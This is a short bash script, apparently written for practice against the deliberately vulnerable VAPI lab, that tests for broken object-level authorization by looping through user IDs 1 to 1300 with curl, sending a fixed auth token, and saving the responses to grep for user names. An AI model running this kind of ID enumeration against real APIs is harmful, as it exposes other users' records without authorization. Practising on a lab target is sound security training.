# Shell script to fuzz for BOLA based upon user ID numbers.
# Created by Tom R. 20230928

# Based upon working with VAPI.
# Create your number list using the command 'seq 1 1300 > numbers.txt' 

# Creates a grepable file which can be searched for values.
# cat output.txt| grep 'Dwight\|Michael\|Jim\|Angela\|Holly\|Pam\|api1\|api3'


#!/bin/bash

# Read each line from numbers.txt
while read -r line; do
  # Execute curl command by replacing 1 with the current line's number
  output=$(curl -i -s -k -X $'GET' \
    -H $'Authorization-Token: cGhvZW5peDpwYXNzd29yZA==' \
    -H $'Content-Type: application/json' \
    -H $'User-Agent: PostmanRuntime/7.33.0' \
    -H $'Accept: */*' \
    -H $'Cache-Control: no-cache' \
    -H $'Postman-Token: 01f323c8-ca43-4e2e-a137-631eb867ab77' \
    -H $'Host: vapi' \
    -H $'Accept-Encoding: gzip, deflate' \
    -H $'Connection: keep-alive' \
    "http://vapi/vapi/api1/user/${line}")
  
  # Print the output to stdout (the screen)
  echo "$output"
  
  # Append the output to output.txt
  echo "$output" >> output.txt
done < numbers.txt

